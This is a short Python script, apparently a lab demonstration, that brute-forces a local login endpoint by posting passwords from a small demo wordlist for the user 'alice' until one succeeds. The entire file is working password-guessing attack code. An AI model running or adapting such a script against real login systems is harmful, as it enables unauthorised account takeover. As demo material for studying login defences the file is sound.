# attacker.py
import requests
import time

url = "http://127.0.0.1:5000/login"

user = "alice"

# demo wordlist
passwords = [
    "123456",
    "alice123",
    "password",
    "qwerty",
    "correcthorsebatterystaple",  # correct password
]

for pwd in passwords:
    print(f"[+] Trying password: {pwd}")

    payload = {"username": user, "password": pwd}

    r = requests.post(url, json=payload)

    print("Response:", r.json())

    # slow down a bit (optional)
    time.sleep(1)

    # stop if login success
    if r.json().get("success"):
        print("[+] Password FOUND:", pwd)
        break
